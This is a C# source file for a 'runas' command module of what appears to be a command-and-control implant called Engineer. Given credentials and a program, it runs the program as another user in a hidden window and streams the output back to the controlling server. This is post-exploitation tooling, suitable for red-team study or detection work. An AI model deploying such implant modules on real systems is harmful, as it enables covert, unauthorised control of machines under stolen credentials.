using DynamicEngLoading;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Security;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class Runas : EngineerCommand
    {
        public override string Name => "runas";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                if (!task.Arguments.TryGetValue("/username", out string username))
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("No username provided", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                }
                if (!task.Arguments.TryGetValue("/password", out string password))
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("No password provided", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                }
                if (!task.Arguments.TryGetValue("/domain", out string domain))
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("No domain provided", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                }
                if (!task.Arguments.TryGetValue("/program", out string program))
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("No program provided", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                }
                if (!task.Arguments.TryGetValue("/args", out string args))
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("No args provided", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                }

                username = username.TrimStart(' ');
                password = password.TrimStart(' ');
                domain = domain.TrimStart(' ');
                program = program.TrimStart(' ');
                args = args.TrimStart(' ');

                SecureString securePassword = new NetworkCredential("", password).SecurePassword;

                //create a new process setting the startup info 
                using var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        Domain = domain,
                        UserName = username,
                        Password = securePassword,
                        FileName = program,
                        Arguments = args,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false
                    }
                };

                //set the output handlers, if possible we should send the output to the server as soon as it is received
                process.OutputDataReceived += (sender, args) => ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(args.Data, task, EngTaskStatus.Running, TaskResponseType.String);
                process.ErrorDataReceived += (sender, args) => ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(args.Data, task, EngTaskStatus.Running, TaskResponseType.String);

                //start the process
                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();
                process.WaitForExit();

                //complete the task
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Process Complete", task, EngTaskStatus.Complete, TaskResponseType.String);

            }
            catch (Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
            }
            
        }
    }
}
